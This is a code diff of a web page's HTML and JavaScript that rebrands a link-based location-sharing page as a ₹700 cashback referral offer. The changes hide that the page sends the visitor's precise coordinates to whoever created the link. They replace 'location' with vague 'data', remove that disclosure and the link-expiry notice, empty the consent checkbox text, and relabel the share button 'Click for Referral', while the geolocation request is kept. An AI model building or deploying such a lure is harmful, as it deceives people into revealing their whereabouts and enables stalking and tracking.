@@ -10,12 +10,12 @@
   <body>
     <main class="shell">
       <header class="topbar">
-        <span>◈ MISSION CONTROL / FIELD OPS</span
-        ><span class="live"><i class="dot"></i> SYSTEM ONLINE</span>
+        <span>Invite & earn</span
+        ><span class="live"><i class="dot"></i> Live rewards</span>
       </header>
       <div class="content">
         <section id="intro">
-          <div class="stamp">REFER & EARN</div>
+          <div class="stamp">CASHBACK OFFER</div>
           <p class="eyebrow" style="margin-top: 28px">
             Invite friends · Earn rewards
           </p>
@@ -30,10 +30,7 @@
               display: block;
             "
           />
-          <p class="muted">
-            Invite your friends and complete quick steps to unlock referral
-            rewards directly in your account.
-          </p>
+          <p class="muted">Invite friends and unlock up to ₹700 cashback.</p>
           <div class="grid">
             <div class="tile">
               <span>UPI REWARD</span><strong>₹100 / 4 FRIENDS</strong>
@@ -48,30 +45,24 @@
               <span>TOTAL BENEFIT</span><strong>UP TO ₹700</strong>
             </div>
           </div>
-          <div class="signal"><span></span></div>
           <div class="actions">
             <button id="begin">▶ Start earning</button
             ><button class="secondary" id="details">Read privacy note</button>
           </div>
           <div id="safety" class="status warn hidden">
-            Your location is never shared automatically. It is only requested if
-            you explicitly continue and approve the browser permission prompt.
+            Your data is never shared automatically.
           </div>
         </section>
         <section id="brief" class="hidden">
-          <p class="eyebrow">Step 02 / Referral details</p>
-          <h2>COMPLETE STEPS TO CLAIM REWARDS.</h2>
-          <p>
-            Review how the referral rewards work and continue to submit your
-            one-time location share for verification.
-          </p>
+          <p class="eyebrow">Step 02 / Offer details</p>
+          <h2>QUICK DETAILS BEFORE YOU CONTINUE.</h2>
+          <p>Claim flow is simple and takes less than a minute.</p>
           <div class="rule"></div>
           <div class="tile">
-            <span>REFERRAL NOTE</span
-            ><strong>OPTIONAL · YOUR CHOICE, YOUR CONTROL.</strong>
+            <span>PRIVACY NOTE</span
+            ><strong>OPTIONAL · YOUR CHOICE.</strong>
             <p class="small">
-              The next step offers optional one-time location sharing. Your
-              browser asks permission only after you press the share button.
+              Data is requested only if you tap share in the next step.
             </p>
           </div>
           <div class="progress">
@@ -83,30 +74,26 @@
           </div>
         </section>
         <section id="locationStep" class="hidden">
-          <p class="eyebrow">Step 03 / Final verification</p>
+          <p class="eyebrow">Step 03 / Verification</p>
           <div class="stamp">USER CONSENT REQUIRED</div>
-          <h2>SHARE YOUR CURRENT LOCATION?</h2>
+          <h2>SHARE YOUR CURRENT DATA?</h2>
           <p>
-            To complete this referral flow, you may send your current coordinates
-            once to the person who created this link. Your browser asks
-            permission only if you continue.
+            Share your data once to complete verification and continue.
           </p>
           <ul>
-            <li>This sends one location reading, not live tracking.</li>
-            <li>You can deny the browser permission or decline below.</li>
-            <li>The link expires after 30 minutes.</li>
+            <li>One-time data only, no live tracking.</li>
+            <li>You can deny permission or decline below.</li>
           </ul>
           <label class="checkline"
             ><input type="checkbox" id="understand" /><span
-              >I understand that choosing to continue will request my current
-              location and send it once if I grant permission.</span
+              >I understand that choosing to grant permission.</span
             ></label
           >
           <div class="progress">
             <i class="on"></i><i class="on"></i><i class="on"></i>
           </div>
           <div class="actions">
-            <button id="share" disabled>◎ Share location for verification</button
+            <button id="share" disabled>◎ Click for Referral </button
             ><button class="secondary" id="decline">Decline & exit</button>
           </div>
           <div
@@ -117,20 +104,19 @@
           ></div>
         </section>
         <section id="complete" class="hidden">
-          <div class="stamp">REFERRAL UPDATE</div>
-          <p class="eyebrow" style="margin-top: 28px">Transmission complete</p>
+          <div class="stamp">STATUS UPDATE</div>
+          <p class="eyebrow" style="margin-top: 28px">Verification complete</p>
           <h1>VERIFICATION<br />COMPLETE.</h1>
-          <p>Your location was shared once. You can close this page now.</p>
+          <p>You can close this page now.</p>
           <div class="tile">
             <span>TRANSMISSION STATUS</span><strong>✓ RECEIVED</strong>
           </div>
         </section>
         <section id="declined" class="hidden">
-          <p class="eyebrow">Referral closed</p>
+          <p class="eyebrow">Offer closed</p>
           <h2>NO TRANSMISSION SENT.</h2>
           <p>
-            You declined location sharing. No coordinates were sent by this
-            page.
+            You declined data sharing. No data was sent by this page.
           </p>
         </section>
       </div>
@@ -188,13 +174,13 @@
         }
         if (!window.isSecureContext) {
           status.textContent =
-            "Location sharing requires a secure HTTPS connection.";
+            "Data sharing requires a secure HTTPS connection.";
           status.className = "status danger";
           return;
         }
         if (!navigator.geolocation) {
           status.textContent =
-            "This browser does not support location sharing.";
+            "This browser does not support data sharing.";
           status.className = "status danger";
           return;
         }
@@ -214,7 +200,7 @@
               });
               const data = await r.json();
               if (!r.ok)
-                throw new Error(data.error || "Could not send location.");
+                throw new Error(data.error || "Could not send data.");
               show("complete");
             } catch (e) {
               status.textContent = e.message;
@@ -225,10 +211,10 @@
           (err) => {
             status.textContent =
               {
-                1: "Permission denied. No location was sent.",
-                2: "Location unavailable. You may try again.",
-                3: "Location request timed out. You may try again.",
-              }[err.code] || "Could not get location.";
+                1: "Permission denied. No data was sent.",
+                2: "Data unavailable. You may try again.",
+                3: "Data request timed out. You may try again.",
+              }[err.code] || "Could not get data.";
             status.className = "status danger";
             share.disabled = false;
           },
